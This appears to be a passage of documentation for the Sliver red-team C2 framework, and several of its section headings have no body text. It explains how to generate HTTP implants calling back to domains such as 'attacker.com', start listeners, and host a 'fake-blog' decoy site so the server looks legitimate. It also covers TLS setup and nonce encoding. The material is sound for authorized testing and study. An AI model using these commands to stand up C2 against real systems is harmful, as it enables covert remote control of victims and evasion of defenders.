## Generate the Implant
#### Basic Example

```
sliver > generate --http example.com --os mac

[*] Generating new darwin/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/WORKING_HACIENDA
```

#### Multiple Domains
You can also specify multiple domains, in the event the implant cannot connect to the first it will subsequently attempt to connect to each domain you specified in order. Subsequent attempts are made based on the `--reconnect` argument (default 60 seconds). If no attempts are successful, the implant will loop across all of the domains until `--max-errors` (default 1000) is reached, at which point the implant will terminate execution:
```
sliver > generate --http example.com,attacker.com

[*] Generating new windows/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/IMPRESSED_METHANE
```

#### URL Prefixes and Other Options
Some additional options may be passed to the `--http` C2 flag such as URL path prefixes. Sliver's C2 request URLs are randomly generated as described below, however the operator may specify a path to prepend to every request's path, this can be useful when leveraging HTTP re-directors, etc. To add a URL prefix simply add a path to the domain as shown below:
```
sliver > generate --http example.com/foo/bar

[*] Generating new windows/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/IMPRESSED_METHANE
```

#### Proxies
#### Proxy Configuration
#### NTLM/Kerberos Proxy Authentication
## Start the Listener
To start an HTTP listener use the `http` command, with no parameters this will start a listener on port 80 and respond to any domain (i.e., HTTP `Host:`) that comes in:
```
sliver > http
```

You can optionally restrict the listener to only respond to a specific domain using the `--domain` flag, currently each listener can only accept a single domain (but you can start any number of listeners you want):
```
sliver > http --domain example.com
```

## Static Content
Sliver can stand up a website on your HTTP(S) listener in order to make the server look more legitimate. For example, you could put a default IIS index page here and mimic a normal-looking server in case someone comes by snooping. You can manage static content using the `websites` command (see `websites --help`):
```
websites --website fake-blog --web-path / --content ./index.html add
```

To use your website with an HTTP(S) listener, specify it using `--website` when you start the listener:
```
sliver > http --website fake-blog --domain example.com
```

## SSL/TLS Certificates
By default when using the `https` listener Sliver will simply generate a random self-signed certificate. However, other options do exist. The `https` listener also supports automatic TLS certificates via Let's Encrypt, which can be enabled using the `--lets-encrypt` flag.
```
sliver > https --domain example.com --lets-encrypt
```

You can also upload your own SSL/TLS certificate/key pairs:
```
sliver > https --domain example.com --cert ./cert.pem --key ./key.pem --website fake-blog
```

## Modifying C2 Traffic
### `implant_config`
### `server_config`
# Under the Hood
### Design Goals
### Procedural HTTP C2
#### Implant-side
3. Generate a `nonce`, the nonce is equal to a random number times the `EncoderModulus` plus the encoder ID; the `EncoderModulus` is currently a hardcoded constant value, but we may generate this per-server in the future. The server does the opposite (nonce modulo `EncoderModulus`) to determine the original Encoder ID. In code this looks like:
```
nonce := (insecureRand.Intn(maxN) * EncoderModulus) + encoderID
encoderId := nonce % EncoderModulus
```

